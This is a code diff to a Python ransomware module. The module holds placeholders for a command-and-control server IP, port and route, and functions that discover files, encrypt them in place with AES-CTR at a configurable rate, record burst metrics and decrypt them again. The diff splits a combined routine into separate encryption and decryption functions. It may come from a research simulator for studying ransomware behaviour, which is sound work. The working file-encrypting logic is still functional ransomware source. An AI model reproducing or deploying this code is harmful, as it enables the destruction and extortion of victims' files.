@@ -17,7 +17,7 @@ from globals import get_config_from_file
 # ============ 		GLOBALS 	  ==============
 # ============================================================
 
-C2_IP = "<C2-Server-IP"
+C2_IP = "<C2-Server-IP>"
 C2_PORT = "<C2-Port>"
 C2_RW_ROUTE = "/rw/done"
 
@@ -125,24 +125,26 @@ def discover_files(start_path):
                     yield absolute_path
 
 
-def modify_file_inplace(file_name, crypto, encrypting, block_size=16):
+def encrypt_file_inplace(file_name, crypto, block_size=16):
     """
-    Open `filename` and encrypt/decrypt according to `crypto`
+    Open `filename` and encrypt according to `crypto`
     :param file_name: a filename (preferably absolute path)
     :param crypto: a stream cipher function that takes in a plaintext,
              and returns a ciphertext of identical length
-    :param encrypting: which mode the algorithm is used in (enc/dec)
     :param block_size: length of blocks to read and write.
     :return: None
     """
     with open(file_name, 'r+b') as f:
         plaintext = f.read(block_size)  # read number of bytes
 
-        if encrypting:  # encrypt
-            config = get_config_from_file()
-            rate = float(config["GENERAL"]["rate"])  # bytes per second
-            bytes_counter = 0
-            enc_start = time()  # time in seconds since epoch
+        # ==============================
+        # PREPARE BURST
+        # ==============================
+
+        config = get_config_from_file()
+        rate = float(config["GENERAL"]["rate"])  # bytes per second
+        bytes_counter = 0
+        enc_start = time()  # time in seconds since epoch
 
         while plaintext:
             ciphertext = crypto(plaintext)
@@ -150,18 +152,51 @@ def modify_file_inplace(file_name, crypto, encrypting, block_size=16):
             f.seek(-len(plaintext), 1)  # return to same point before the read
             f.write(ciphertext)
 
-            if encrypting:  # encrypt
-                bytes_counter += len(plaintext)
-                enc_running = time() - enc_start  # time in seconds
-                if rate > 0 and rate * enc_running < bytes_counter:  # encryption rate is limited
-                    # if r * b < f then r * (b + n) = f, thus n = f/r - b
-                    subprocess.call('echo "{}" > ./{}'.format((bytes_counter / enc_running), RATE_FILE), shell=True)
-                    even_out = (bytes_counter / rate) - enc_running
-                    # print("sleeping for {} to limit rate - r {} d {} s {}".format(
-                    #     "%.5f" % even_out, rate, "%.5f" % enc_running, bytes_counter))
-                    sleep(even_out)
-                elif rate == 0:
-                    subprocess.call('echo "{}" > ./{}'.format((bytes_counter / enc_running), RATE_FILE), shell=True)
+            # ==============================
+            # HANDLE BURST
+            # ==============================
+
+            bytes_counter += len(plaintext)
+            enc_running = time() - enc_start  # time in seconds
+            if rate > 0 and rate * enc_running < bytes_counter:  # encryption rate is limited
+                # if r * b < f then r * (b + n) = f, thus n = f/r - b
+                subprocess.call('echo "{}" > ./{}'.format((bytes_counter / enc_running), RATE_FILE), shell=True)
+                even_out = (bytes_counter / rate) - enc_running
+                # print("sleeping for {} to limit rate - r {} d {} s {}".format(
+                #     "%.5f" % even_out, rate, "%.5f" % enc_running, bytes_counter))
+                sleep(even_out)
+            elif rate == 0:
+                subprocess.call('echo "{}" > ./{}'.format((bytes_counter / enc_running), RATE_FILE), shell=True)
+
+            # ==============================
+            # ITERATE FILE CONTENT
+            # ==============================
+
+            if len(ciphertext) < len(plaintext):
+                # since the decrypted text is smaller than the encrypted, the block_size was not reached.
+                # this means that we have reached the EOF of the original file
+                f.truncate()
+
+            plaintext = f.read(block_size)
+
+
+def decrypt_file_inplace(file_name, crypto, block_size=16):
+    """
+    Open `filename` and decrypt according to `crypto`
+    :param file_name: a filename (preferably absolute path)
+    :param crypto: a stream cipher function that takes in a plaintext,
+             and returns a ciphertext of identical length
+    :param block_size: length of blocks to read and write.
+    :return: None
+    """
+    with open(file_name, 'r+b') as f:
+        plaintext = f.read(block_size)  # read number of bytes
+
+        while plaintext:
+            ciphertext = crypto(plaintext)
+
+            f.seek(-len(plaintext), 1)  # return to same point before the read
+            f.write(ciphertext)
 
             if len(ciphertext) < len(plaintext):
                 # since the decrypted text is smaller than the encrypted, the block_size was not reached.
@@ -214,7 +249,8 @@ def select_decryption_algorithm(filename, key):
         return AES.new(key, AES.MODE_CTR, counter=ctr), "1"
 
 
-def write_burst_metrics_to_file(files_nr, files_size, total_duration, curr_duration, pause, conf_rate, curr_rate, algorithm):
+def write_burst_metrics_to_file(files_nr, files_size, total_duration, curr_duration, pause, conf_rate, curr_rate,
+                                algorithm):
     file_path = path.join(path.abspath(path.curdir), "metrics.txt")
     if not path.exists(file_path):
         with open(file_path, "x") as file:
@@ -242,7 +278,7 @@ def encrypt_files(key, start_dirs):
 
                 crypt, flag, extra = select_encryption_algorithm(key)
                 try:
-                    modify_file_inplace(file, crypt.encrypt, encrypting=True)
+                    encrypt_file_inplace(file, crypt.encrypt)
                 except OSError as e:
                     if e.strerror == "Read-only file system":
                         continue
@@ -297,7 +333,7 @@ def decrypt_files(key, start_dirs):
         for file in discover_files(curr_dir):
             if file.endswith(EXTENSION):
                 crypt, flag = select_decryption_algorithm(file, key)
-                modify_file_inplace(file, crypt.decrypt, encrypting=False)
+                decrypt_file_inplace(file, crypt.decrypt)
 
                 abs_dir = path.dirname(file)
                 file_original = ".".join(path.basename(file).split(".")[:-2])
